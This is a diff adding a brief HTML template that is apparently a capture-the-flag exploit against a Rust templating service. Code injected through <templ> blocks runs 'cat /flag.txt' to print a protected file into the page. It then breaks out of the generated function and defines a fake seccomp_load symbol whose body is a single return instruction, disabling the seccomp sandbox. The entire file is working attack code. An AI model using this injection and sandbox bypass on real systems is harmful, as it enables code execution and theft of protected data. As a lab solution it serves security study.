@@ -1,0 +1,25 @@
+<html>
+<title><templ>"Page Title".to_string()</templ></title>
+<h1><templ>"bruh".to_string()</templ></h1>
+
+<templ>
+use std::process::Command;
+let output = Command::new("cat").arg("/flag.txt").output().unwrap().stdout;
+use std::str;
+    let s = match str::from_utf8(&output) {
+        Ok(v) => v,
+        Err(e) => panic!("Invalid UTF-8 sequence: {}", e),
+    };
+    s.to_string()
+
+}
+
+#[no_mangle]
+#[link_section=".text"]
+pub static seccomp_load: [u8; 1] = [195];
+
+fn nothing() {
+    ()
+
+</templ>
+</html>
